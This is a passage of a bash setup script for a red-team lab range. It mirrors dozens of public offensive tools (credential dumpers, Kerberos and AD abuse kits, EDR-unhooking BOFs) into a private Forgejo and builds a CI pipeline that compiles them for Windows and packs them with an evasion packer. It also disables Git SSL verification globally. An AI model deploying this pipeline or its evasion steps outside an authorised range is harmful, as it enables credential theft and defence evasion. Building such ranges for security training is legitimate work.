def desc = instance.getDescriptor('hudson.plugins.git.GitSCM')
desc.setGlobalConfigName('Labyrinth Setup')
desc.setGlobalConfigEmail('setup@labyrinth.range')
desc.save()
instance.getGlobalNodeProperties().replaceBy(
  [new hudson.slaves.EnvironmentVariablesNodeProperty(
    [new hudson.slaves.EnvironmentVariablesNodeProperty.Entry('GIT_SSL_NO_VERIFY', 'true')]
  )]
)
instance.save()
['git', 'config', '--global', 'http.sslVerify', 'false'].execute().waitFor()
println('OK')")

case "$http_code" in
    200) echo "  Git SSL verification disabled globally" ;;
    *)   echo "  WARNING: could not disable Git SSL verification (HTTP ${http_code})"
         echo "  Set it manually: Manage Jenkins > System > Global properties > Environment variables"
         echo "    Name: GIT_SSL_NO_VERIFY  Value: true"
         echo "  And on the Jenkins server: git config --global http.sslVerify false" ;;
esac

# --------------------------------------------------------------------------
# 11. Mirror offensive tooling repos
# --------------------------------------------------------------------------
echo "[*] Mirroring offensive tooling repos..."

declare -A TOOL_MIRRORS=(
    # C# - GhostPack
    ["offensive-tooling/Rubeus"]="https://github.com/GhostPack/Rubeus|csharp|Kerberos abuse toolkit"
    ["offensive-tooling/Seatbelt"]="https://github.com/GhostPack/Seatbelt|csharp|Host situational awareness"
    ["offensive-tooling/SharpUp"]="https://github.com/GhostPack/SharpUp|csharp|Privilege escalation checks"
    ["offensive-tooling/Certify"]="https://github.com/GhostPack/Certify|csharp|AD CS abuse"
    ["offensive-tooling/SharpDPAPI"]="https://github.com/GhostPack/SharpDPAPI|csharp|DPAPI credential extraction"
    ["offensive-tooling/SharpWMI"]="https://github.com/GhostPack/SharpWMI|csharp|WMI lateral movement and remote execution"
    ["offensive-tooling/Lockless"]="https://github.com/GhostPack/Lockless|csharp|Copy locked files by reading raw disk"
    ["offensive-tooling/SafetyKatz"]="https://github.com/GhostPack/SafetyKatz|csharp|In-memory Mimikatz via PE patching"
    ["offensive-tooling/KeeThief"]="https://github.com/GhostPack/KeeThief|csharp|Extract KeePass master keys from memory"
    # C# - AD attack
    ["offensive-tooling/SharpHound"]="https://github.com/BloodHoundAD/SharpHound|csharp|BloodHound data collector"
    ["offensive-tooling/SharpView"]="https://github.com/tevora-threat/SharpView|csharp|AD enumeration"
    ["offensive-tooling/StandIn"]="https://github.com/FuzzySecurity/StandIn|csharp|AD post-exploitation toolkit"
    ["offensive-tooling/Whisker"]="https://github.com/eladshamir/Whisker|csharp|Shadow Credentials attack"
    ["offensive-tooling/SharpLAPS"]="https://github.com/swisskyrepo/SharpLAPS|csharp|Retrieve LAPS passwords from AD"
    ["offensive-tooling/SharpGPOAbuse"]="https://github.com/FSecureLABS/SharpGPOAbuse|csharp|Abuse GPOs for privesc and persistence"
    ["offensive-tooling/ADCSPwn"]="https://github.com/bats3c/ADCSPwn|csharp|Privesc via AD Certificate Services"
    ["offensive-tooling/Snaffler"]="https://github.com/SnaffCon/Snaffler|csharp|Find credentials in network shares"
    ["offensive-tooling/SharpShares"]="https://github.com/mitchmoser/SharpShares|csharp|Enumerate accessible network shares"
    # C# - Lateral movement
    ["offensive-tooling/SharpExec"]="https://github.com/anthemtotheego/SharpExec|csharp|Lateral movement via WMI SMB SCM WinRM"
    ["offensive-tooling/SharPersist"]="https://github.com/mandiant/SharPersist|csharp|Windows persistence toolkit"
    ["offensive-tooling/SharpMove"]="https://github.com/0xthirteen/SharpMove|csharp|Lateral movement via WMI DCOM SCM"
    ["offensive-tooling/SharpRDP"]="https://github.com/0xthirteen/SharpRDP|csharp|Remote command execution via RDP"
    # C# - Evasion
    ["offensive-tooling/NetLoader"]="https://github.com/Flangvik/NetLoader|csharp|Load .NET assemblies with AMSI/ETW bypass"
    ["offensive-tooling/GodPotato"]="https://github.com/BeichenDream/GodPotato|csharp|Privilege escalation to SYSTEM"
    ["offensive-tooling/ConfuserEx"]="https://github.com/mkaring/ConfuserEx|csharp|.NET assembly obfuscator"
    # BOF collections
    ["offensive-tooling/CS-Situational-Awareness-BOF"]="https://github.com/trustedsec/CS-Situational-Awareness-BOF|c|TrustedSec situational awareness BOFs"
    ["offensive-tooling/CS-Remote-OPs-BOF"]="https://github.com/trustedsec/CS-Remote-OPs-BOF|c|TrustedSec remote ops BOFs"
    ["offensive-tooling/C2-Tool-Collection"]="https://github.com/outflanknl/C2-Tool-Collection|c|Outflank BOF collection"
    ["offensive-tooling/FindObjects-BOF"]="https://github.com/outflanknl/FindObjects-BOF|c|BOF to enumerate processes by modules"
    ["offensive-tooling/CredBandit"]="https://github.com/xforcered/CredBandit|c|BOF for LSASS minidump via syscalls"
    ["offensive-tooling/unhook-bof"]="https://github.com/rsmudge/unhook-bof|c|BOF to remove EDR/AV userland hooks"
    ["offensive-tooling/BOF-RegSave"]="https://github.com/EncodeGroup/BOF-RegSave|c|BOF to dump SAM/SYSTEM/SECURITY hives"
    ["offensive-tooling/BOFs-ajpc500"]="https://github.com/ajpc500/BOFs|c|BOFs for ETW patching and injection"
    ["offensive-tooling/InlineExecute-Assembly"]="https://github.com/anthemtotheego/InlineExecute-Assembly|c|BOF for inline .NET assembly execution"
    # C/C++ tools
    ["offensive-tooling/nanodump"]="https://github.com/fortra/nanodump|c|LSASS minidump via syscalls"
    ["offensive-tooling/donut"]="https://github.com/TheWover/donut|c|Generate PIC shellcode from .NET PEs"
    ["offensive-tooling/mimikatz"]="https://github.com/gentilkiwi/mimikatz|c|Credential extraction and Kerberos attacks"
    ["offensive-tooling/BokuLoader"]="https://github.com/boku7/BokuLoader|c|CS reflective loader with evasion"
    ["offensive-tooling/KaynLdr"]="https://github.com/Cracked5pider/KaynLdr|c|Reflective DLL loader"
    ["offensive-tooling/TartarusGate"]="https://github.com/trickster0/TartarusGate|c|Syscall retrieval past EDR hooks"
    ["offensive-tooling/SysWhispers2"]="https://github.com/jthuraisamy/SysWhispers2|c|Direct syscall stub generation"
    ["offensive-tooling/SysWhispers3"]="https://github.com/klezVirus/SysWhispers3|c|Syscall generation with evasion techniques"
    ["offensive-tooling/PrintSpoofer"]="https://github.com/itm4n/PrintSpoofer|c|Privesc from service accounts to SYSTEM"
    ["offensive-tooling/PPLdump"]="https://github.com/itm4n/PPLdump|c|Dump protected process memory"
    ["offensive-tooling/PEzor"]="https://github.com/phra/PEzor|c|Shellcode and PE packer with evasion"
    # Go tools
    ["offensive-tooling/chisel"]="https://github.com/jpillora/chisel|go|TCP/UDP tunnel over HTTP"
    ["offensive-tooling/ligolo-ng"]="https://github.com/nicocha30/ligolo-ng|go|Tunneling and pivoting tool"
    ["offensive-tooling/kerbrute"]="https://github.com/ropnop/kerbrute|go|Kerberos bruteforce and user enum"
    ["offensive-tooling/peirates"]="https://github.com/inguardians/peirates|go|Kubernetes attack tool"
    ["offensive-tooling/Limelighter"]="https://github.com/Tylous/Limelighter|go|Fake code-signing certificate generator"
    ["offensive-tooling/httpx"]="https://github.com/projectdiscovery/httpx|go|HTTP toolkit for web probing"
    ["offensive-tooling/nuclei"]="https://github.com/projectdiscovery/nuclei|go|Template-based vulnerability scanner"
    ["offensive-tooling/subfinder"]="https://github.com/projectdiscovery/subfinder|go|Passive subdomain enumeration"
    # Rust tools
    ["offensive-tooling/RustScan"]="https://github.com/RustScan/RustScan|rust|Fast port scanner"
    ["offensive-tooling/feroxbuster"]="https://github.com/epi052/feroxbuster|rust|Recursive content discovery"
    # Packing Tools
    ["offensive-tooling/Calypso"]="https://github.com/Whispergate/Calypso|cpp|C++23 syscall packer with AMSI/ETW bypass encryption and obfuscation"
)

migrate_count=0
migrate_total=${#TOOL_MIRRORS[@]}
for repo_path in "${!TOOL_MIRRORS[@]}"; do
    IFS='/' read -r org repo <<< "${repo_path}"
    IFS='|' read -r upstream lang desc <<< "${TOOL_MIRRORS[$repo_path]}"
    migrate_count=$((migrate_count + 1))

    echo "  [${migrate_count}/${migrate_total}] Importing ${repo} from ${upstream}..."

    # Import with retry (Forgejo can 504 under load from cloning many repos)
    for attempt in 1 2 3; do
        http_code=$($CURL -s -o /dev/null -w "%{http_code}" \
            -X POST "${FORGEJO_URL}/api/v1/repos/migrate" \
            -H "Content-Type: application/json" \
            -d "{
                \"clone_addr\": \"${upstream}\",
                \"repo_name\": \"${repo}\",
                \"repo_owner\": \"${org}\",
                \"description\": \"${desc}\",
                \"mirror\": false,
                \"private\": true,
                \"service\": \"github\"
            }" 2>/dev/null || echo "000")

        if [[ "$http_code" == "201" || "$http_code" == "409" ]]; then
            break
        fi

        if [[ "$attempt" -lt 3 ]]; then
            echo "    attempt ${attempt} failed (HTTP ${http_code}), retrying in 10s..."
            sleep 10
        else
            echo "    failed after 3 attempts (HTTP ${http_code}), skipping ${repo}"
        fi
    done

    # Pace the requests so Forgejo doesn't choke
    sleep 3
done

# --------------------------------------------------------------------------
# 12. Daedalus tooling-build pipeline (single shared job for
#     daedalus_obfuscate_build - takes REPO_URL as a parameter,
#     compiles all tools regardless of language)
# --------------------------------------------------------------------------
echo "[*] Setting up Daedalus tooling-build pipeline..."

# Create the repo
$CURL -X POST "${FORGEJO_URL}/api/v1/orgs/offensive-tooling/repos" \
    -H "Content-Type: application/json" \
    -d '{"name": "daedalus-tooling-build", "description": "Shared Daedalus tooling build pipeline", "private": true, "auto_init": true}' \
    2>/dev/null || echo "  repo 'daedalus-tooling-build' may already exist"

# Enable actions
$CURL -s -X PATCH "${FORGEJO_URL}/api/v1/repos/offensive-tooling/daedalus-tooling-build" \
    -H "Content-Type: application/json" \
    -d '{"has_actions": true}' \
    >/dev/null 2>&1 || true

# Push Jenkinsfile.tooling + Forgejo tooling workflow
TOOLING_DIR="${TMPDIR}/daedalus-tooling-build"
GIT_SSL_NO_VERIFY=true git clone -q "${FORGEJO_GIT_URL}/offensive-tooling/daedalus-tooling-build.git" "$TOOLING_DIR" 2>/dev/null || {
    echo "    clone failed - skipping tooling pipeline setup"
}

if [[ -d "$TOOLING_DIR" ]]; then
    pushd "$TOOLING_DIR" >/dev/null

    # Jenkinsfile for Daedalus buildWithParameters dispatch
    if [[ -f "${SCRIPT_DIR}/Jenkinsfile.tooling" ]]; then
        cp "${SCRIPT_DIR}/Jenkinsfile.tooling" Jenkinsfile
    fi

    # Forgejo Actions workflow for Daedalus workflow_dispatch
    mkdir -p .forgejo/workflows
    cat > .forgejo/workflows/tooling.yml <<'TOOLING_WORKFLOW'
name: Daedalus Tooling Build

on:
  workflow_dispatch:
    inputs:
      REPO_URL:
        description: "Git clone URL of the tool repo"
        type: string
        required: true
      REPO_TOKEN:
        description: "Access token for private repos"
        type: string
        required: false
        default: ""
      REF:
        description: "Branch or tag to checkout"
        type: string
        required: false
        default: "main"
      SOURCE_PATH:
        description: "Subdirectory or file to compile (empty = repo root)"
        type: string
        required: false
        default: ""
      LANGUAGE:
        description: "Build language: csharp, go, rust, c-mingw, cpp-mingw, nim"
        type: string
        required: false
        default: "csharp"
      OUTPUT_FORMAT:
        description: "Output format: exe, dll, bin, shellcode, svc"
        type: string
        required: false
        default: "exe"
      OBFUSCATION:
        description: "Obfuscation: none or calypso"
        type: string
        required: false
        default: "none"

jobs:
  build:
    runs-on: [self-hosted, maas]

    steps:
      - name: Clone tool repo
        run: |
          CLONE_URL="${{ inputs.REPO_URL }}"
          if [ -n "${{ inputs.REPO_TOKEN }}" ]; then
            CLONE_URL="${CLONE_URL/https:\/\//https://token:${{ inputs.REPO_TOKEN }}@}"
          fi
          git clone --depth 1 --branch "${{ inputs.REF }}" "$CLONE_URL" repo
          echo "[+] Cloned ${{ inputs.REPO_URL }} @ ${{ inputs.REF }}"

      - name: Build
        working-directory: repo/${{ inputs.SOURCE_PATH }}
        run: |
          mkdir -p ${GITHUB_WORKSPACE}/build
          echo "[*] Language=${{ inputs.LANGUAGE }} Format=${{ inputs.OUTPUT_FORMAT }}"

          case "${{ inputs.LANGUAGE }}" in
            csharp)
              TARGET=$(find . -maxdepth 3 -name '*.sln' | head -1)
              [ -z "$TARGET" ] && TARGET=$(find . -maxdepth 3 -name '*.csproj' | head -1)
              [ -z "$TARGET" ] && { echo "[-] No .sln or .csproj found"; exit 1; }
              dotnet build "$TARGET" -c Release -o ${GITHUB_WORKSPACE}/build
              ;;
            go)
              GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o ${GITHUB_WORKSPACE}/build/ ./...
              ;;
            rust)
              cargo build --release --target x86_64-pc-windows-gnu
              cp target/x86_64-pc-windows-gnu/release/*.exe ${GITHUB_WORKSPACE}/build/ 2>/dev/null || true
              cp target/x86_64-pc-windows-gnu/release/*.dll ${GITHUB_WORKSPACE}/build/ 2>/dev/null || true
              ;;
            c-mingw)
              if [ -f Makefile ]; then
                make CC=x86_64-w64-mingw32-gcc
                find . -maxdepth 2 \( -name '*.exe' -o -name '*.dll' \) -exec cp {} ${GITHUB_WORKSPACE}/build/ \;
              else
                SOURCES=$(find . -name '*.c' -not -path './build/*' | sort | tr '\n' ' ')
                x86_64-w64-mingw32-gcc -o ${GITHUB_WORKSPACE}/build/tool.exe $SOURCES -s -O2
              fi
              ;;
            cpp-mingw)
              if [ -f Makefile ]; then
                make CXX=x86_64-w64-mingw32-g++
                find . -maxdepth 2 \( -name '*.exe' -o -name '*.dll' \) -exec cp {} ${GITHUB_WORKSPACE}/build/ \;
              else
                SOURCES=$(find . -name '*.cpp' -o -name '*.cc' | sort | tr '\n' ' ')
                x86_64-w64-mingw32-g++ -o ${GITHUB_WORKSPACE}/build/tool.exe $SOURCES -s -O2 -static
              fi
              ;;
            nim)
              ENTRY=$(find . -maxdepth 2 -name '*.nim' | head -1)
              nim c -d:mingw -d:release -d:strip --opt:size --app:gui -o:${GITHUB_WORKSPACE}/build/tool.exe "$ENTRY"
              ;;
            *) echo "[-] Unknown language: ${{ inputs.LANGUAGE }}"; exit 1 ;;
          esac
          echo "[+] Build complete"
          ls -la ${GITHUB_WORKSPACE}/build/

      - name: Obfuscate
        if: inputs.OBFUSCATION != 'none'
        run: |
          PACK_MODE="--peinject"
          [ "${{ inputs.LANGUAGE }}" = "csharp" ] && PACK_MODE="--type csharp"
          for f in build/*.exe; do
            [ -f "$f" ] || continue
            echo "[*] Packing $f with Calypso ($PACK_MODE)"
            calypso --file "$f" $PACK_MODE --output "${f%.exe}-packed.exe" --hide --unhook ntdll.dll
            mv "${f%.exe}-packed.exe" "$f"
          done

      - name: Upload artifact
        uses: actions/upload-artifact@v3
        with:
          name: tooling-build-${{ github.run_id }}
          path: build/
TOOLING_WORKFLOW

    git add -A
    if ! git diff --cached --quiet; then
        GIT_SSL_NO_VERIFY=true git \
            -c user.name="Labyrinth Setup" \
            -c user.email="setup@labyrinth.range" \
            commit -q -m "Add Daedalus tooling build pipeline"
        GIT_SSL_NO_VERIFY=true git push -q origin main 2>/dev/null || echo "    push failed"
    else
        echo "    already up to date"
    fi

    popd >/dev/null
fi

# Create Jenkins job for the shared tooling pipeline
create_jenkins_job "daedalus-tooling-build" "offensive-tooling" "daedalus-tooling-build"

# --------------------------------------------------------------------------
# Summary
# --------------------------------------------------------------------------
echo ""
echo "=========================================="
echo "  Setup complete"
echo "=========================================="
echo ""
echo "  Range:        10.${RANGE_OCTET}.x.x"
echo "  Forgejo:      ${FORGEJO_URL} (${FORGEJO_USER})"
echo "  Jenkins:      ${JENKINS_URL} (${JENKINS_USER})"
echo "  Mythic:       ${MYTHIC_URL}"
echo "  LitterBox:    ${LITTERBOX_URL}"
if [[ -n "${DAEDALUS_TOKEN:-}" ]]; then
echo "  Daedalus tok: ${DAEDALUS_TOKEN}"
fi
echo ""
echo "  Daedalus provider config for Mythic Eventing UI:"
echo ""
echo "    Forgejo provider:"
echo "      url:   ${FORGEJO_URL}"
echo "      token: ${DAEDALUS_TOKEN:-<create manually or set DAEDALUS_FORGEJO_TOKEN>}"
echo "      owner: offensive-tooling"
echo ""
echo "    Jenkins provider:"
echo "      url:   ${JENKINS_URL}"
echo "      user:  ${JENKINS_USER}"
echo "      token: <generate at ${JENKINS_URL}/user/${JENKINS_USER}/security/>"
echo ""
echo "  Each build repo now contains:"
echo "    .forgejo/workflows/build.yml  - Daedalus workflow_dispatch target"
echo "    Jenkinsfile                   - Full Jenkins pipeline"
echo "    tools/pe-sanitise.py          - PE metadata sanitisation tool"
echo "    build-profiles.yml            - Predefined build profiles"
echo ""
echo "  Daedalus tooling pipeline (daedalus_obfuscate_build):"
echo "    Jenkins job:  daedalus-tooling-build"
echo "    Forgejo repo: offensive-tooling/daedalus-tooling-build"
echo "    Forgejo wf:   .forgejo/workflows/tooling.yml"
